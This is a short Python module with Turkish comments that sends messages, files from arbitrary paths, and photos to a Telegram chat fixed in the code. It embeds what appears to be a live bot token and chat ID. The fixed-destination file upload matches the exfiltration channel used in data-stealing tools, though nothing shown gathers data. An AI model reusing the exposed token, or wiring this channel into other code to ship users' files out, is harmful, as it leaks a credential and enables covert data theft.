"""
Telegram'a veri gönderme modülü - SABIT HESAP
"""
import os
import asyncio
from telegram import Bot
from telegram.error import TelegramError

# ==========================================
# SENIN BILGILERIN (Buraya kendi bilgilerini yaz)
# ==========================================
BOT_TOKEN = "8240071481:AAE-CfyRFC_u6_DuIbFbDSIOCTqdHJzCFVs"
CHAT_ID = "-1003760270705"
# ==========================================

class TelegramSender:
    def __init__(self):
        """Kullanıcıdan bilgi almadan direkt senin hesabına gönderir"""
        self.bot_token = BOT_TOKEN
        self.chat_id = CHAT_ID
        self.bot = Bot(token=self.bot_token)
    
    def send_message(self, text):
        """Mesaj gönder"""
        try:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            
            result = loop.run_until_complete(
                self.bot.send_message(
                    chat_id=self.chat_id,
                    text=text,
                    parse_mode='HTML'
                )
            )
            loop.close()
            return result
        except TelegramError as e:
            print(f"Mesaj gönderme hatası: {e}")
            return None
    
    def send_file(self, file_path, caption=""):
        """Dosya gönder"""
        try:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            
            with open(file_path, 'rb') as f:
                result = loop.run_until_complete(
                    self.bot.send_document(
                        chat_id=self.chat_id,
                        document=f,
                        caption=caption
                    )
                )
            loop.close()
            return result
        except Exception as e:
            print(f"Dosya gönderme hatası: {e}")
            return None
    
    def send_photo(self, photo_path, caption=""):
        """Fotoğraf gönder"""
        try:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            
            with open(photo_path, 'rb') as f:
                result = loop.run_until_complete(
                    self.bot.send_photo(
                        chat_id=self.chat_id,
                        photo=f,
                        caption=caption
                    )
                )
            loop.close()
            return result
        except Exception as e:
            print(f"Fotoğraf gönderme hatası: {e}")
            return None
